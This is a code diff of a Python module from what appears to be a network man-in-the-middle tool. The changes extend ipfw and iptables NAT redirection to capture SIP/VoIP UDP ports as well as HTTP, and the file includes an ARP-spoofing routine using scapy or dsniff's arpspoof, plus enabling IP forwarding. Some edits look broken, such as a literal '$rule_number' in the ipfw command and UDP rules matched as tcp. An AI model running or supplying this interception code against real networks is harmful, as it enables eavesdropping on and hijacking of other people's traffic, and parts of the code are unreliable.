@@ -60,6 +60,9 @@ def find_my_default_router_and_interface():
     if ml.interface == "":
         ml.interface = router_interface
 
+    # Let's also store the router's IP address.
+    ml.router_ip = router_ip
+
     return (router_interface,router_ip)
 
 def find_mac_and_bcast(interface):
@@ -142,20 +145,38 @@ def redirectIPFWstart():
     ipfw_lines=ipfw_cmd.readlines()
     ipfw_cmd.close()
 
-    # TODO: Refactor this and its analogues to handle multiple ports.
+    #
+    # Create a list of ports we want to capture.
+    #
 
-    found_line=0
-    for line in ipfw_lines:
-        if re.match(r"^01000 fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port 80 in via",line):
-            found_line=1
+    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
+    # where dest_port is the port the traffic was originally destined for,
+    # while proxy_port is the one on which we proxy that traffic.
 
-    if not found_line:
-        ipfw_modify=os.popen("/sbin/ipfw add 1000 fwd 127.0.0.1,%s tcp from any to any dst-port 80 in via %s" % (ml.port,interface) )
+    # First, put the SIP ports into the list.
+    ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
+    # Now add the HTTP ports
+    ml.redirection_ports.append(["tcp",int(ml.port),80])
 
-    found_line
+    # Keep a rule number counter.
+    rule_number = 1000
+    for port_tuple in ml.redirection_ports:
+        (proto,dest_port,proxy_port) = port_tuple
+
+        found_line=0
+        for line in ipfw_lines:
+            pattern = "^%d fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port %d in via" % (rule_number,dest_port)
+            if re.match(pattern,line):
+                found_line=1
+
+        if not found_line:
+            ipfw_modify=os.popen("/sbin/ipfw add $rule_number fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (proxy_port,dest_port,interface) )
+
+        rule_number = rule_number + 1
 
 def redirectIPFWstop():
 
+    # TODO: Adapt the above routine.
     # Run ipfw list, so we can look for a rule that starts with 01000
     ipfw_cmd=os.popen("/sbin/ipfw list","r")
     ipfw_lines=ipfw_cmd.readlines()
@@ -189,28 +210,54 @@ def redirectIPTablesNewStart():
     from netfilter.rule import Rule,Match,Target
     from netfilter.table import Table
 
-    target=Target("REDIRECT","--to-ports %s" % str(ml.port))
-    prerouting_rule = Rule(
-      protocol='tcp',
-      matches=[Match('tcp', '--dport 80')],
-      jump=target)
+    #
+    # Create a list of ports we want to capture.
+    #
 
+    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
+    # where dest_port is the port the traffic was originally destined for,
+    # while proxy_port is the one on which we proxy that traffic.
+
+    # First, put the SIP ports into the list.
+    ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
+    # Now add the HTTP ports
+    ml.redirection_ports.append(["tcp",int(ml.port),80])
+
+    # Access the iptables nat table.
     nat_table = Table('nat')
-    nat_table.prepend_rule('PREROUTING', prerouting_rule)
 
+    # Build a rule to capture traffic destined for port 80.
+    for port_tuple in ml.redirection_ports:
+        (proto,dest_port,proxy_port) = port_tuple
+        target = Target("REDIRECT","--to-ports %d" % proxy_port)
+        prerouting_rule = Rule(
+          protocol=proto,
+          matches=[Match('tcp', '--dport %d' % (dest_port) )],
+          jump=target)
+
+
+        nat_table.prepend_rule('PREROUTING', prerouting_rule)
 
 def redirectIPTablesNewStop():
     from netfilter.rule import Rule,Match,Target
     from netfilter.table import Table
 
-    target=Target("REDIRECT","--to-ports %s" % str(ml.port))
-    prerouting_rule = Rule(
-      protocol='tcp',
-      matches=[Match('tcp', '--dport 80')],
-      jump=target)
-
+    # Access the iptables nat table.
     nat_table = Table('nat')
-    nat_table.delete_rule("PREROUTING",prerouting_rule)
+
+    # Build a rule to capture traffic destined for port 80.
+    for port_tuple in ml.redirection_ports:
+        (proto,dest_port,proxy_port) = port_tuple
+
+        # Rebuild the rule we build before.
+        target = Target("REDIRECT","--to-ports %d" % proxy_port)
+        prerouting_rule = Rule(
+          protocol=proto,
+          matches=[Match('tcp', '--dport %d' % (dest_port) )],
+          jump=target)
+
+        # Now remove this rule.
+        nat_table.delete_rule("PREROUTING",prerouting_rule)
 
 def redirectIPTablesStop():
 
@@ -225,8 +272,7 @@ def redirectIPTablesStop():
 ####################################################################################################
 
 def arpspoof_via_scapy(impersonated_host, victim_ip, my_mac, my_broadcast):
-    #from scapy.all import ARP,IP,send,srp,sr1,conf
-    from scapy import ARP,IP,send,srp,sr1,conf
+    from scapy.all import ARP,IP,send,srp,sr1,conf
 
     # Note that we're using scapy, so the ARP spoof shutdown code knows it needs to send
     # corrective ARP replies.
@@ -343,7 +389,7 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
         except ImportError:
             # If scapy isn't present, let's use dsniff's arpspooof program
             print "Arpspoofing requires either scapy or dsniff's arpspoof program.\n"
-            print "Could not import scapy - trying arpspoof command.\n"
+            print "Could not import scapy - using arpspoof instead.\n"
 
             call( ["arpspoof %s" % (impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)
 
@@ -377,7 +423,7 @@ def start():
         os.system(r"echo 1 >/proc/sys/net/ipv4/ip_forward")
         ml.jjlog.debug("On Linux - just set /proc/sys/net/ipv4/ip_forward to 1.")
 
-        redirectIPTablesNewStart()
+        redirectIPTablesStart()
 
     # Next check if we're on Windows (Cygwin)
     elif sys.platform[:3] == r"win":
@@ -424,7 +470,7 @@ def stop():
     elif sys.platform == "linux2":
 
         # Turn off the packet mangling / port redirection.
-        redirectIPTablesNewStop()
+        redirectIPTablesStop()
         ml.jjlog.debug("Just deactivated firewall-based port redirection.")
 
         # Deactivate packet forwarding via proc
